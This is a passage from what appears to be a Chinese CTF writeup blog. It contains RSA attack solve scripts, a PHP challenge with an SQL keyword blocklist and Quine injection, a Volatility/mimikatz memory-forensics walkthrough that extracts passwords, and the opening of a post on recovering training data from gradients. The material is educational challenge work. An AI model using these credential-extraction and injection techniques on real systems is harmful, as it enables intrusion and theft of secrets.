    <url>/2024/03/11/2024HSCCTF-Writeup/</url>
    <content><![CDATA[<h1>2024HSCCTF-Writeup</h1>
<h2 id="CheckIN">CheckIN</h2>
<p><img src="https://s2.loli.net/2024/03/11/ZgKMrm6ctjpH1k5.png" alt="2024HSCCTF_1"></p>
<h2 id="CRYPTO">CRYPTO</h2>
<h3 id="FUNNY">FUNNY</h3>
<p><img src="https://s2.loli.net/2024/03/11/iUVtPu9XwbJpsE6.png" alt="2024HSCCTF_2"></p>
<h3 id="REAL-SIGN-IN">REAL_SIGN_IN</h3>
<p>低指数加密广播攻击</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n1 = <span class="number">13266094979118433615107077438835111371457503704538616496563510289250600197984029767950953071723442381279904747724269706555801425883117040972832035397268347603612025741219452353130266755150965019441092380030226256032720651858600172996344598355816134478110939124633509594465443169697188695226358357129879780253706604232278678465680358018262084198108533077519049507811758423498512565521615931699494491595078723098101084217611204442585182103261006086144344612398896576066999950905966920722348056083426326740287336766359383868804991393096926457607860171709146742941740864780610226463852018204647096292737915760430291250813</span></span><br><span class="line">c1 = <span class="number">10454892625278317641789872724686322205927252335791803070937784201169059579634108503308033729970364983743915474860354063759051514315619953792921367621385574749886778911471839079815820922430263016140141364094131496885155882486798302404238523986615316359385759537428069831379320707742928167131988641527992674882901567191207763547432299532710945549959580670112346830919500694014972444803904248586178887470465867991650480024904327432717911313867713120525202669101524778826445503383549733326775312427637839488477432162027468606568090607495541492335140760946449358303999218277269859230888292780234275495274787996001069959971</span></span><br><span class="line">n2 = <span class="number">13561524319281645924409429988746244285924512610515302181526524036825687984904507677894611353344735741110533280540372734178963216876945066232927791369207852762146826883906093804958723203309030840804897999205074456325062789110452940484077408580876939074453733126571662068654441714639301799127584606087971553812926212292460761915985786461807649546286330834719746624387850833859250717790492671884734393055454074719585937904232516659582736211933280011591605069686791049628396762690038333975652490908544846890333889140489210242676577675968427325105786641017561929481335597681693818435892140856959673754213600282444761045909</span></span><br><span class="line">c2 = <span class="number">3809937396638973793281111150837774607768836561256425490071061814543315217182689579329457784159377040740840790603579270672790822179042079055887400637582022659400594844425891666493759469522229692267103516295923589666151948947533002975509430505778081264268698292606209538047240829756919764958544518311993684790118122163859571923899116815269989298822142104789156965964388346807167061332155392766290531602747731916010774318400533536413925876554324550780136191458776623029231802991319498346243427246484439391940676640693616519788950250194620455331557435567742874072637005171754550020619361150150760807391307377493836703076</span></span><br><span class="line">n3 = <span class="number">20819967432768567938753694422911303382713641435728476601586838051751312782014589687874100683447016549893853820399247909653519950995166805072380656652093579604808569443345700131756901813968185726839863492859231569896747987531341038527577030274701158504736611486411122416871876820360598851918276248520018793494992493852386399935919098185299268920688465446256283333918993392163947559470887074488117510961172278330026050882249897526926951246915378841961743261451053094912730850754242934166148766977209435597121171360066632973035097557482087715745940551760350028517912402795353929678770383484462337839762404384487582066453</span></span><br><span class="line">c3 = <span class="number">11563829913521314742585136805475993461403465700108053759771484386843765447294825812595747844564874801821547385942939017711043792590427266240133027831461974927558652665067213878683577605892319949704019193752250409813868906421753286690558646631157080887991363101311595921894128110588310204725909211948500421818595333014728114922612870236792445180757918034580210383348205174677492784034863701447097219480133095005954043490631339361280493810083309703940614371501369647446672052159714963350601039281652141446041256158792981347520865671115091097366786582678000769990989485879756562971825181583852052194492966890258786944315</span></span><br><span class="line">n4 = <span class="number">19517605474769458566764053169103203900538883167125789442948194023333599294853531273087386563161613748743818343948170765525802041313369094525708034240492038517491037697421019698672940028061489377078569027204940525741751607758706837789276571889269840463242449627036923444536643477208091664006240106337894541529098279162689793633659155131183323675883233214674098857553487390844015483326711766090826364639791072315148015450491509411705543419711632894282105698410629463141048089867016193055384530738113369352506445669521342292860468297676826301170714618519525841753642713267083007541894156522819536935129135488289198694889</span></span><br><span class="line">c4 = <span class="number">12720867554077215609167247949706745145667570273372296302246080668969511222297653722462456233088262153562301044885409538816931281414687572296907970004441185871229786306419586839050961363065587925188623309437687878362349712010861419409491068481019724226070296781806932012179356550421791040143093709543578156689726256993615533679238619784087615967419616376736870824897695863732260595608905898821074250285903989668303290834003098691902990265526695777899489911426855957844561961729063644070823142386451495647995297413399808476505524581260464059786283824394788336780567702950051743361294131648282343329587709077103035316720</span></span><br><span class="line">n5 = <span class="number">15315765971812428868126611109300419975777573811870059860288938012581131143314666287089472408729190306740351316922426244732585067377217502116440145450875665683575473308102742095244349804293311006664351646952181210686812748912418175736013835669191549110546127830831456068811493086787520032272004231879188572130659936937680177977058975692716116961651093033986073297040678707534300965722868263825444198679243070507413216087205293997006805636338567585815764233374917745809135568855524993022583535608349280044851332779641619210310837108819273508771161881712796235518243572549756276118053736270122787899173695729089911000177</span></span><br><span class="line">c5 = <span class="number">1996576325989768324317887012680560370528949194626393664650182754791578697786369958145137743555674312911707989139883926276952465377328602829900403114611234863417183707678398047030046855450074260654432278156903388641948696716193734714839957624359533486844023111115297718398319120718217043728064595217651738180806194912581964346594873253580010279706758241793778842399330631789750327865945625117967957133863637176404309782516880511747771793712203903185512285327103080133567660391921038681393551945607152726063692641742286406772926103324078574181176632321287759066802783643421564667257668981655199672490410258387124896839</span></span><br><span class="line">n6 = <span class="number">22501623321194869030526666823514739767749207843970334295553523279818676682652976959807729381646792676134988101065783136759904452189288813040860021497429422935571083993146794186207853146483681094375360774768406629588311381375206331368965836725531623084019451921330442379292718421616088275750226791314378297932358311378533569620671423740598033204639634035814689781736104197321348154999759210532651451336192376531975837284751978609197068573278551236896713762616106051882505752287773203197087939983952212761603430314087275042009367400077728025285967811883773835952547025411853395307325959904214255100115763377527761863243</span></span><br><span class="line">c6 = <span class="number">16972901653690784382193404778525843883847230468707217844241233207197480301434902629018088740822889948972102445668033489181324675531537650785766582307112083721410506834279363487814759021815005839906656731069521758605293428928322712895510490968448490116732590950772037788323801838566829526879837783860631971103738986788475652187080935944428662363573097225322630574705977616143315497272754050608117449938161772409924992453640310621899223691851303921323537779068346575997621024660907750345496836548887894110692437965970524341315015139872598871247336564148953981001708145253728789799483753931039894943324458172207408514055</span></span><br><span class="line">n7 = <span class="number">20222972180177072345801227937253710431874005900913732040381986459681923475683145372990375296354647420667483866455563976492495863306613645199351725323069254033914660444884681801701527128578914815647228265457580192591405358646605069362025887082090772778349481109768859094222573588734354390770166651349176555216207359309348018342505464249804607873118984688190648392606550835717828160317062604597079101529586592809846608153548090689114431569844519317969076852156023429809918618137153901636552629572816865533796914796916912143735510069871682428043277595493567381686086440480398579063801490541087200975224372047447666853577</span></span><br><span class="line">c7 = <span class="number">19248329020030453774384696880312801243022181399316695013193573740699955812434234453445733160128408889312090775734047782876100145988183327884917215679382382881065419870764186721970622248713761494850863082727373673264251951250813933154161422645331713437130381414540777017708015790836797014483890216068812718266206449620134392843370036352310247384624064366465809379383305877737001168693796305842850301708205795174536047495356081533121119809621200677554802850741327026857766466801847093397207492834507197621929666294565502206253758771807936447505283097006026148803103761799795917848061959407655084012166916418019312249784</span></span><br><span class="line">n8 = <span class="number">28799545621025859784610107508239196961299975467825740831913751504915874851330462439158635575405356818113410333683180082332165697120427112955103148744439425445183885200419323900649247390987373643732545351428341672132606990651983217136427779727640093677134233750683573339125630816150512829880758197582740742903567508671599670638441690064624970884849155079924261319378412468315205937959638074779010811695132863607314175199659821450983825173738122749043063821539706648079731459596593171608003970504410762959266052601005965264083020025264976022719772719760327913949451765549596654112776579032915566112007668167772800022899</span></span><br><span class="line">c8 = <span class="number">1557912453709476966737076991561069916132026563623952214325899450684779611396005511525194425002377424080593548871717093344298154722414402662579348749814362372502553596876087924405512346139642130044966150910684629355033505918013408065432489689359533653824531829749196503353303426506457519870729578421517704788083837871239684468506646791031429111449024396111145925900274462731352865657439734650971847748974665555525054155117163435567228916046859498167502129739768590572170326191362542459346405142436764480239930123323175219488501180973820200030365386979265642090761227134669853119027964377516064450203673169996741108201</span></span><br><span class="line">n9 = <span class="number">10724722645304259715795299819065674754042984013786210584506231300619560676108475536395272046569973743641251757746061197828519780315618458377103563062231183483417813026164932742828160245936263717653018746001798106670074713826425538758327538077666818411803556790303118703675214570232032363741244652199877829850941356975349610433270602500949664737614829264570720376982697613497917773407899889472415398738368753150300782201701629840263791099898799223939097237737763305744244520913831151361155926462086252389196548583215275230652627205709362921989235487237437830519479308853639024184940767904019468405024567279269194660457</span></span><br><span class="line">c9 = <span class="number">7054636121132343583858699301095750714111235817920115459468707884725018199621185268565462099537583727231123935665880304441155106987655834264363622503952228720525242179508079016631089564472694196928292967592007090527901832440980478605545275893294775905732209796463597105116676363505607644384293210905609044898854823349412282236466031666385339991490559120640881321780940909164095426401350314009757434019464208207922992311335823038396957805698822367795673327054284423260967631762122524511318733561339982590040303505605155884427567432712042870632816967182611225212150848091424300840160529323960243459920269872536666352976</span></span><br><span class="line">n10 = <span class="number">16304817901397483417456609341516124523232426780023397228272913044723365389571327797134591736977502692057727416394924310828824378024812777529367342707896494815960255682947685036902235997899886291633609041685897197272675911304941501067794795285949540313990226409651292120126492714998892290044111541098365692731185787360609198921681736777103794430653696698141195954719030883935151980847339939213040373252819145655067286986300641668994700390921458682571619409488233289211738521046085311253119526685912893458131534718050802684180285138809217274273877376347024021056317566312186133916744533463879779997794540361760393219489</span></span><br><span class="line">c10 = <span class="number">6039122660803656157700054739064564338439549484695206214016006129508782362229842967602464077735874540107161459041835340990108817139672137870642935613531313583963930144871458733026396223674801557621036949312116639217447114899726858984281194116508244403985568785765273838572470898925521147022021516862658967584135454474355381073026066426450614788381002057980590442338766869104957577338546687759141228942149374485785893539335288536729328218172278370763183603422629799846611737710865681572257803448960656692506773086527389616178693152885260795303008111935277529561576915114165678564997923634906377059491989399467738069641</span></span><br><span class="line">n11 = <span class="number">26625591570108917991847624024325819020320989255483608230644879476517915211995542896341416515605576928392317717654695767006784744751962205355107012859426134474074616134986414248054781712130892076462288761672616993287474215271046602443215449210026303978249752825306035097841429567784265656890801589418315449927543660131967365276637662563112328427813183398517944210120851841495001293543971765864382060100600179108814852829473884481867272716907064729991187798328733196676298681328399250356028155411865948758466337763025886685436650643428510593697176416735568250615673642866668416526682341721998481502482877972649018501469</span></span><br><span class="line">c11 = <span class="number">20247005397625616228661928392695469647749434533141783786437968083066137357689767280753532605896419173332597529708801946906363780592876111104850302784033136335456683361128603662454728234349563238948801712907903185993561076754164552845510795293521029798357876214260903355702688269527465118808832941386890598851762900876512383557653940846232884627557957652638581022140825373023173482471791720148792301241581919765510220083079365311297081633979398855966991069020584462613981094888736916444009463104235004451765533162593406749138640537670707679905027165914805299755934758172748227146495107002603546338597452964759860431081</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i + <span class="number">1</span>, <span class="number">11</span>):</span><br><span class="line">        ni = <span class="built_in">eval</span>(<span class="string">&quot;n&quot;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">        nj = <span class="built_in">eval</span>(<span class="string">&quot;n&quot;</span> + <span class="built_in">str</span>(j))</span><br><span class="line">        p = gcd(ni, nj)</span><br><span class="line">        <span class="keyword">if</span> p &gt; <span class="number">1</span>:</span><br><span class="line">            c = <span class="built_in">eval</span>(<span class="string">&quot;c&quot;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">            q = ni // p</span><br><span class="line">            d = invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">            flag = long_to_bytes(<span class="built_in">pow</span>(c, d, ni))</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<h3 id="SIGN-IN">SIGN_IN</h3>
<p><a href="https://blog.csdn.net/qq_53283643/article/details/118518486">2021-07-06_pow(m + getprime(10), dp, r1 * p), pow(m, dq, r2 *-CSDN博客</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">c1, c2</span>):</span><br><span class="line">    xp = c1 % p</span><br><span class="line">    xq = c2 % q</span><br><span class="line">    <span class="comment"># Chinese Remainder Theorem</span></span><br><span class="line">    m = (xp*inverse(q, p)*q + xq*inverse(p, q)*p) % N</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line">N = <span class="number">20807018344486474639307429177279931766730766338068107239915507489300098048895435781756514265069820029246382818970733268271541419058569567895618666922180270584064313671561310704041755422624879418184008100473568396190523033929320245716340019444764233261191278982354931492880877566550189410854395486995604287009460090861952156686772486228583819235930673806632618770875593810617784176409247510465542253043645164164225524491704753384493817563203956665022724674535516870726747405974392352500432805602085261375142216501656342533659731098891481615791354504343987459436489040377662127479793769523359343534307819013289699807101</span></span><br><span class="line">g1 = <span class="number">13669954919111873554762685722926885077118528999414402163291237939605095249827361266585404348819936899557500751307328088850133462100189908649705354225171362748567332828733792410877365393472368767642223613483944864421225366984013053159643284842823692865975521013400160643858123645513020647367033022539177063702511618272018019345686324322865461583030805528508961559861228807898458344763909703624723082316946660539208262816734999777236686904487167545596412866146192769859422435979617441355968077981338491466670291310491623996943880557071723073298267310617017933994938481600905833829730599911183096116409487608858717083764</span></span><br><span class="line">g2 = <span class="number">16004755272896973088305242134835363565950101667041191767091338528075710730690484241256646402124331734165332717221873300040844257120250717798419429003342474882969292183331631773486056363790119500409511338474885148624744719334829519138941747721940978742668429331169327121848561577357339194970483392418062307133642660625962426570987080348107999849220769541832138719358407833846252908305766546561532003650472770370573552424932908544299331489147220956574184822433945571318688467182365231955276573176433559755313822566687880866791301904461559170416753669109833335824210853322226762705537051009387847122221014380228383127427</span></span><br><span class="line"></span><br><span class="line">c1, c2 = (<span class="number">15258813801182767957948809411445530114743580005667897427534365589851124401953952700888032330082278736578651674105204553630115929829327520950316902504433079359916257355896937562916556083469602985115254272625361902512966905366505705193603115063442567259505806926885597909346860116511116593562896739734663097631870026814495999405532329662713707140991693625596972404484374296588505369466138353714461787853643947646268147993568111775200297788443085689323703846485412670213780175163562460311256388185948613714551169278328397181176821021494625532973065606678522088011055084956579073665474553688838705105692370860815836968744</span>, <span class="number">6812252973072040071827764212287068485224506664962923279994614164374840095630460681859406585838865259535150445414577263383839286602668872146630568583093203237350230531896113453730563536559780725054737930704052263836882704963528437893607940373145674848731274193348770450738356162141551719346994698149112827383011042635625991946491545698464513315705253441372356270248537025391519052228332747340090073726648071921053097612521949040588826684887577900030607964457543549015338544684381220552952995724701579427363382069065679545196826947900332605250858694574423497096207350532949517663416877954484913664168104807510052994343</span>)</span><br><span class="line"></span><br><span class="line">p=gcd(N,g1-<span class="number">1</span>)</span><br><span class="line">q=gcd(N,g2-<span class="number">1</span>)</span><br><span class="line">m=decrypt(c1,c2)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="MIXED">MIXED</h3>
<p>边做边学</p>
<p><a href="https://blog.csdn.net/XiongSiqi_blog/article/details/130175464">数论推导题_东华杯fermat’s revenge-CSDN博客</a></p>
<p>[<a href="https://blog.csdn.net/shshss64/article/details/133917577">NSSCTF 2nd]Math-CSDN博客</a><a href="https://blog.csdn.net/shshss64/article/details/133917577">https://blog.csdn.net/shshss64/article/details/133917577</a>)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n1 = <span class="number">14689930167621480307737218855980844793204825453111553640005733004311399091452749419195261723160562669712981077205514482387428543859060408330555457873612388970840075555219318724209919379670375754436986322725018229701175825510253987615017542205904982728558285520666278391637251512741084978804344612886660251741043298476839942441197788722691248949008018299101517153067904692310160459839327965213126456776042470327923603098133019640956702820908299859534676381094974148722668171932091455546601087513513432342088579253210930555185169910878657816252698605590059713584044287411998445279104965229112287195772355914014694372863</span></span><br><span class="line">n2 = <span class="number">17914624231045471060767877283214815212078805279600237578901916178851704643026979522270658635212967285131654546207286875722198040564094351690066028556053274118826426726436922152056884333790850220488793722836758989770231697392015361745717234225528175411653330848965062023338707342188196332661335758350340958332400847642883219650661408895191363079017750144776587598058350920393498114498603046807597288603882782473322630631915467470131090200369527436760313289344813744004003957932606166823948354564464154141854938585629799995141656546295799610158824771809513458197812936595649326475123400845178122171317543843802357238737</span></span><br><span class="line">c = <span class="number">13183645788828584902734975771833842634134772971197066374278716198331982362845597338541987579827576129126962300555023319276896080171662261983323670516457816608069076576704379871559881585100353737989915143190277856145677733747073530969459479608854483866886381406790221076900624083605418670450439523062190633487764982399334967431524831264337949814367905185282600511829794170139623625545288981992093108619556180352620171550284923452864402624195790781899415138548827684042790774382313520961335293225295922563245148598807498320652973409239921962292395269739151692443069186695137458774227330748775469621908962878548784542656</span></span><br><span class="line">h0 = <span class="number">5690435858632801053001568276569200811072324786394351282330736437777643891675713760267573500875018036769819201228707494676033534733516436880434000381152290529934127584047681184797730806321117079578438213106595566102910231831641994870770844810797745935336962801658360541755214075101149142486964461669833043007174173934693214526552375910644574723526164021660497474760514459351270699055076380763188021265735007339272243426286470006040246926184305520860068095134003662496837644875879106318233600478000160450338727054920011063536387532763661934972965357326471012678550188382945584128136131833085006239075931753900705852481</span></span><br><span class="line">h1 = <span class="number">12771704142231361356944931328203992824809472923288035056741145310446323135378739806430357600688780862532180394967607429708811767590541126019805423171023560973250443508427614362854583240402451944730512334908779225174763498122005198084487562912524477476241978066554026569609494641830034817298185887790987627444544391680388213205514284116732325350187204519755399841372144149840914651521842402817701298224803289451378581226204084757079457612984358925767378458994608562174048729806309230061089552045138514542758457243626150673888166620841134063713151240297774551489301504222933127458884374866611598279831562420720169790688</span></span><br><span class="line">h2 = <span class="number">10768269134499905916388929049595509895751098112372323618798542159569174051578701710549609054808995774168931375186213550074900373023970882450822655786787740452681278837907191091338575561570211280095894576674089666981683405385847773819238581725093823429776684561667462626941518248024517707992035438082636259838822562843169441572048956484831730615047363383911454662789736761572912893234212875097536978423758275178050708616505311352511923810654873380808201395656416903900326634569672173228265730515727327832588326581592485713225927319225942965110285477266200380452637746037672411388696006933080509164615786616058664496851</span></span><br><span class="line"></span><br><span class="line">x1 = <span class="built_in">pow</span>(h1 * <span class="built_in">pow</span>(<span class="number">2023</span>, <span class="number">114</span>, n1),<span class="number">514</span>,n1) % n1</span><br><span class="line">x2 = <span class="built_in">pow</span>(h2 * <span class="built_in">pow</span>(<span class="number">2024</span>, <span class="number">514</span>, n1),<span class="number">114</span>,n1) % n1</span><br><span class="line">q = gmpy2.gcd(n1, x1 - x2)</span><br><span class="line">p1 = n1 // q</span><br><span class="line">p = GCD(<span class="built_in">pow</span>(<span class="number">2024</span>,n2,n2) - h0,n2)</span><br><span class="line">q1 = n2 // p</span><br><span class="line">n = p * q</span><br><span class="line">phi = (p - <span class="number">1</span>)*(q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="WEB">WEB</h2>
<h3 id="PWD">PWD</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$con</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;ccut&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waffff</span>(<span class="params"><span class="variable">$sql</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/infor|sys|sql|thread|case|when|if|like|left|right|mid|cmp|sub|locate|position|match|find|field|sleep|repeat|lock|bench|process|&lt;|&gt;|=|xor|and|&amp;&amp;|\\\\/i&quot;</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">waffff</span>(<span class="variable">$password</span>);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$user_result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$user_result</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一个Quine注入，详细看链接，类似第五空间的题</p>
<p><a href="https://cloud.tencent.com/developer/article/2287111">SQL注入之Quine注入-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
<p><img src="https://s2.loli.net/2024/03/11/WIvYRld2NJP8sre.png" alt="2024HSCCTF_3"></p>
<h3 id="SHIROSHORTMENSHELL">SHIROSHORTMENSHELL</h3>
<p>一个shiro漏洞的利用</p>
<p><img src="https://s2.loli.net/2024/03/11/uyQGEvYlcUaArtP.png" alt="2024HSCCTF_6"></p>
<p><img src="https://s2.loli.net/2024/03/11/cfd9IFC2rNxX4Ge.png" alt="2024HSCCTF_7"></p>
<h3 id="TMPL">TMPL</h3>
<p>SSTI注入</p>
<p><img src="https://s2.loli.net/2024/03/11/6pdBeCUismVKTlA.png" alt="2024HSCCTF_8"></p>
<h2 id="Misc">Misc</h2>
<h3 id="SIGN-IN-2">SIGN_IN</h3>
<p><img src="https://s2.loli.net/2024/03/11/PsO7jzpcSMdYu53.png" alt="2024HSCCTF_4"></p>
<p>首先发现存在两张jpg图片，分离后得到密钥HAPPY_NEW_YEAR</p>
<p>然后通过密钥发现存在outguess隐写</p>
<p><img src="https://s2.loli.net/2024/03/11/br5TfnLDXaSvZ69.png" alt="2024HSCCTF_5"></p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>HSCCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2024西湖论剑-Writeup</title>
    <url>/2024/02/02/2024%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-Writeup/</url>
    <content><![CDATA[<h1>2024西湖论剑-Writeup</h1>
<h2 id="easy-rawraw">easy_rawraw</h2>
<p><strong>考点：内存分析，密码提取</strong></p>
<p>重新对这道题剖析一下</p>
<p>本题的描述为easy raw! many passwords!</p>
<p>关键词为passwords</p>
<p>有端联想，可能存在的就是账户的密码，剪切板中是否存在密码，是否有密码的hash，以及一些可能的爆破操作</p>
<p>首先看一下账户的密码，有两种方法</p>
<p>第一种是PasswareKitForensic</p>
<p><img src="https://s2.loli.net/2024/02/02/Zgcjdf7PslzYxia.png" alt="2024西湖论剑_1"></p>
<p>第二种是使用mimikatz</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#确定镜像版本</span><br><span class="line">vol.py -f rawraw.raw imageinfo</span><br><span class="line">vol.py --plugins=./volatility/plugins/ -f rawraw.raw  --profile=Win7SP1x64 mimikatz</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/02/02/bMwQquC2hcr5iax.png" alt="2024西湖论剑_2"></p>
<p>其次还存在一个密码</p>
<p>也有两种方法</p>
<p>第一种是010打开，搜索关键词检索我们可以发现</p>
<p><img src="https://s2.loli.net/2024/02/02/aCFMNyxAcOGQep7.png" alt="2024西湖论剑_4"></p>
<p>第二种我们检索一下剪切板内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vol.py -f rawraw.raw --profile=Win7SP1x64 clipboard</span><br><span class="line">vol.py -f rawraw.raw --profile=Win7SP1x64 clipboard -v  #查看详细内容</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/02/02/FdwmvIgG2kbYhio.png" alt="2024西湖论剑_5"></p>
<p><img src="https://s2.loli.net/2024/02/02/MJdNU1CocaFPOxS.png" alt="2024西湖论剑_6"></p>
<p>接着，继上面得到两个密码后，我们来搜索密码关键词</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vol.py -f rawraw.raw --profile=Win7SP1x64 filescan | grep pass</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/02/02/TY7WsbnJz6Lli1C.png" alt="2024西湖论剑_3"></p>
<p>发现存在一个压缩包</p>
<p>然后将其dump出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vol.py -f rawraw.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003df8b650 -D ./</span><br></pre></td></tr></table></figure>
<p>分离出一张图片，图片里有压缩包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@DESKTOP-BESI31C:/home/wjy/tools/volatility-master# binwalk pass.png </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             PNG image, 510 x 133, 8-bit/color RGBA, non-interlaced</span><br><span class="line">3185          0xC71           TIFF image data, big-endian, offset of first image directory: 8</span><br><span class="line">9831          0x2667          Zip archive data, encrypted at least v2.0 to extract, compressed size: 1906, uncompressed size: 3299, name: pass.txt</span><br><span class="line">11881         0x2E69          End of Zip archive, footer length: 49, comment: &quot;Have a good New Year!!!!!!!&quot;</span><br></pre></td></tr></table></figure>
<p>然后根据这个提示很容易猜出秘密就是20240210，当然直接爆破也是很快的</p>
<p>于是得到了一个密码本</p>
<p>我们查看进程可以发现存在一个VeraCrypt.exe</p>
<p><img src="https://s2.loli.net/2024/02/02/5XBzJ2vFIbu73ZD.png" alt="2024西湖论剑_7"></p>
<p>先使用<code>DasrIa456sAdmIn987</code>去解压mysecretfile.rar</p>
<p>然后进行挂载，并使用pass.txt作为密码本去解密</p>
<p>在隐藏项目中发现一个data.xlsx，但也存在密码，我们使用第一个获取的<code>das123admin321</code></p>
<p><img src="https://s2.loli.net/2024/02/02/tfXjoNUalyiwS64.png" alt="2024西湖论剑_8"></p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>西湖论剑</tag>
      </tags>
  </entry>
  <entry>
    <title>AI-CTF（1）Alice-AI系列</title>
    <url>/2023/11/17/AI-CTF%EF%BC%881%EF%BC%89Alice/</url>
    <content><![CDATA[<h1>AI-CTF（1）Alice-AI系列</h1>
<h2 id="2022-CTF">2022*CTF</h2>
<h3 id="Alice’s-challenge">Alice’s challenge</h3>
<p>题目描述</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Alice and Bob decided to train a better AI model with their own data sets. However, Bob doesn’t want to show Alice all his secrets, especially his original pictures, so he only gave Alice some training gradients. But is it really safe?</span><br><span class="line">艾丽斯和鲍勃决定使用各自的数据集训练一个更好的人工智能模型。然而，鲍勃不想向艾丽斯展示他所有的机密，特别是他的原始图片，所以他只提供了一些训练梯度给艾丽斯。但这真的安全吗？</span><br></pre></td></tr></table></figure>
<p>从提示很明显看出本题的核心就是梯度恢复数据。</p>
<p>这是出题人给出的完整exp，现在结合<a href="https://link.zhihu.com/?target=https%3A//github.com/mit-han-lab/dlg%E5%8E%9F%E8%AE%BA%E6%96%87%E5%A4%8D%E7%8E%B0%E4%BB%A3%E7%A0%81%E6%9D%A5%E8%A7%A3%E6%9E%90%E7%90%86%E8%A7%A3%E6%96%B9%E6%B3%95%E3%80%82">https://link.zhihu.com/?target=https%3A//github.com/mit-han-lab/dlg原论文复现代码来解析理解方法。</a></p>
